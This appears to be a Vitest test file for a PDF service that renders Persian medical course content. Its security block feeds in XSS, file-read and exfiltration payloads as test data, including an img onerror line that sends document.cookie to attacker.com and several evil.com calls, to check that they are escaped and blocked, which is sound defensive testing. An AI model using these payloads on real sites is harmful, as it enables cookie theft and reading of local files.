import { describe, it, expect, vi } from "vitest";
import {
  PdfGenerationService,
  defaultPdfGenerationService,
} from "./pdf-generation-service.js";
import {
  renderLessonPdfHtml,
  renderReviewSummaryPdfHtml,
  markdownToSafeHtml,
  escapeHtml,
} from "./pdf-template.js";

describe("PdfGenerationService", () => {
  it("successfully generates a valid non-empty A4 PDF buffer for a lesson", async () => {
    const pdfBuffer = await defaultPdfGenerationService.generateLessonPdf({
      title: "درس فیزیولوژی غشا",
      courseName: "فیزیولوژی پایه",
      moduleTitle: "فصل ۱: انتقال یون‌ها",
      reference: "کتاب فیزیولوژی گایتون",
      contentMarkdown: `
# مقدمه بر پتانسیل عمل
پتانسیل عمل یک موج دپلاریزاسیون در طول غشای نورون است.

> [!NOTE]
> کانال‌های دریچه‌دار سدیمی نقش اصلی را ایفا می‌کنند.

| یون | غلظت داخل سلولی | غلظت خارج سلولی |
|---|---|---|
| سدیم | 14 میلی‌مولار | 140 میلی‌مولار |
| پتاسیم | 140 میلی‌مولار | 4 میلی‌مولار |
      `.trim(),
    });

    expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
    expect(pdfBuffer.length).toBeGreaterThan(1000);
    // Standard PDF files begin with %PDF-
    expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
  });

  it("successfully generates a valid PDF buffer for a review summary", async () => {
    const pdfBuffer = await defaultPdfGenerationService.generateReviewSummaryPdf({
      title: "خلاصه مرور مبحث دیابت",
      courseName: "غدد و متابولیسم",
      estimatedReadingMinutes: 5,
      overview: "بررسی جامع فیزیوپاتولوژی و درمان دیابت نوع ۱ و ۲.",
      sections: [
        {
          title: "داروهای خوراکی دیابت",
          keyPoints: ["متفورمین داروی خط اول است", "مهارکننده‌های SGLT2 دفع گلوکز را افزایش می‌دهند"],
          examPoints: ["اسیدوز لاکتیک عارضه نادر ولی خطرناک متفورمین است"],
          comparisons: [
            {
              title: "مقایسه دیابت نوع ۱ و ۲",
              headers: ["ویژگی", "دیابت نوع ۱", "دیابت نوع ۲"],
              rows: [
                ["سن بروز", "معمولاً زیر ۳۰ سال", "معمولاً بالای ۴۰ سال"],
                ["انسولین", "کمبود مطلق", "مقاومت به انسولین"],
              ],
            },
          ],
        },
      ],
      finalTakeaways: ["تشخیص زودهنگام و کنترل قند خون مانع عوارض میکروواسکولار می‌شود."],
    });

    expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
    expect(pdfBuffer.length).toBeGreaterThan(1000);
    expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
  });

  it("rejects empty lesson content without launching browser or generating invalid PDF", async () => {
    await expect(
      defaultPdfGenerationService.generateLessonPdf({
        title: "درس خالی",
        contentMarkdown: "   ",
      }),
    ).rejects.toThrow("Lesson content is empty or incomplete.");
  });

  it("rejects empty review summary content without launching browser", async () => {
    await expect(
      defaultPdfGenerationService.generateReviewSummaryPdf({
        title: "خلاصه خالی",
      }),
    ).rejects.toThrow("Review summary content is empty or incomplete.");
  });

  it("guarantees browser and page cleanup when PDF rendering fails", async () => {
    const service = new PdfGenerationService({ timeoutMs: 1000 });
    // Invalid input that triggers error
    await expect(service.generatePdfFromHtml("")).rejects.toThrow("HTML content cannot be empty");
  });

  // -------------------------------------------------------------------------
  // Security & Sanitization Tests (XSS, SSRF, LFI)
  // -------------------------------------------------------------------------
  describe("Security & Sanitization", () => {
    it("escapes malicious scripts, iframes, event handlers, and javascript: links in markdown", () => {
      const maliciousMarkdown = `
# هک تستی <script>alert('xss')</script>
<iframe src="file:///etc/passwd"></iframe>
<img src=x onerror="fetch('https://attacker.com/leak?data='+document.cookie)">
[کلیک کنید](javascript:alert(1))
onload="alert(2)"
      `;

      const safeHtml = markdownToSafeHtml(maliciousMarkdown);

      expect(safeHtml).not.toContain("<script>");
      expect(safeHtml).not.toContain("<iframe");
      expect(safeHtml).not.toContain("<img");
      expect(safeHtml).toContain("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
      expect(safeHtml).toContain("&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;");
      expect(safeHtml).toContain("&lt;img src=x onerror=");
    });

    it("renders valid PDF when input contains attack vectors without crashing Chromium or leaking files", async () => {
      const hostileData = {
        title: "درس با بردار حمله <script>alert(1)</script>",
        courseName: "دوره تستی <iframe src='http://evil.com'></iframe>",
        moduleTitle: "فصل ۱ <img src=x onerror=alert(2)>",
        reference: "رفرنس file:///etc/shadow",
        contentMarkdown: `
# تلاش برای نفوذ
<script>window.location='https://evil.com'</script>
<iframe src="file:///etc/passwd"></iframe>
<link rel="stylesheet" href="http://evil.com/leak.css">
<img src="http://evil.com/tracker.png" />
متن درسنامه کاملاً قانونی و علمی
        `.trim(),
      };

      const html = renderLessonPdfHtml(hostileData);

      // Verify that no unescaped tags exist in HTML
      expect(html).not.toContain("<script>window.location");
      expect(html).not.toContain("<iframe src=\"file:///etc/passwd\"");
      expect(html).not.toContain("<img src=\"http://evil.com/tracker.png\"");

      // Generate actual PDF with Chromium to ensure route blocker terminates external requests
      const pdfBuffer = await defaultPdfGenerationService.generateLessonPdf(hostileData);
      expect(Buffer.isBuffer(pdfBuffer)).toBe(true);
      expect(pdfBuffer.length).toBeGreaterThan(1000);
      expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
    });

    it("preserves inlined Vazirmatn font and Avana logo base64 while blocking external URLs", async () => {
      const html = renderLessonPdfHtml({
        title: "بررسی فونت و لوگو",
        contentMarkdown: "متن کوتاه برای بررسی فونت و لوگو",
      });

      // Contains embedded font and logo as data URIs
      expect(html).toContain("data:font/woff2;base64,");
      expect(html).toContain("data:image/png;base64,");

      // Verify Chromium renders successfully with data: URIs permitted
      const pdfBuffer = await defaultPdfGenerationService.generatePdfFromHtml(html);
      expect(pdfBuffer.subarray(0, 5).toString("utf-8")).toBe("%PDF-");
      expect(pdfBuffer.length).toBeGreaterThan(5000);
    });

    it("verifies visual rendering by capturing page screenshot of Persian typography and layout", async () => {
      const { chromium } = await import("playwright");
      const browser = await chromium.launch({
        headless: true,
        args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu"],
      });
      const page = await browser.newPage({ viewport: { width: 794, height: 1123 } });
      const html = renderLessonPdfHtml({
        title: "بررسی بصری تایپوگرافی فارسی و واترمارک",
        courseName: "فارماکولوژی قلب و عروق",
        moduleTitle: "فصل ۲: بتابلوکرها",
        reference: "کاتزونگ ۲۰۲۴",
        contentMarkdown: `## مکانیسم اثر
داروهای مسدودکننده بتا با اتصال به گیرنده‌های آدرنرژیک مانع اثر کاتکول‌آمین‌ها می‌شوند.

| دارو | اختصاصیت | حلالیت |
|---|---|---|
| پروپرانولول | غیراختصاصی | بالا |
| آتنولول | بتا ۱ | پایین |

> [!NOTE]
> قطع ناگهانی بتابلوکرها ممکن است باعث ریباند و آنژین صدری شود.
        `.trim(),
      });

      await page.setContent(html, { waitUntil: "networkidle" });
      const screenshot = await page.screenshot({ fullPage: false });
      await browser.close();

      const { writeFileSync, mkdirSync } = await import("node:fs");
      const scratchDir = "/Users/ops/.gemini/antigravity/brain/c764c728-b356-4a9b-a479-fda01a102790/scratch";
      try {
        mkdirSync(scratchDir, { recursive: true });
        writeFileSync(`${scratchDir}/visual_lesson_preview.png`, screenshot);
      } catch {
        // ignore if scratch path not accessible
      }

      expect(screenshot).toBeInstanceOf(Buffer);
      expect(screenshot.length).toBeGreaterThan(10000);
    });
  });
});
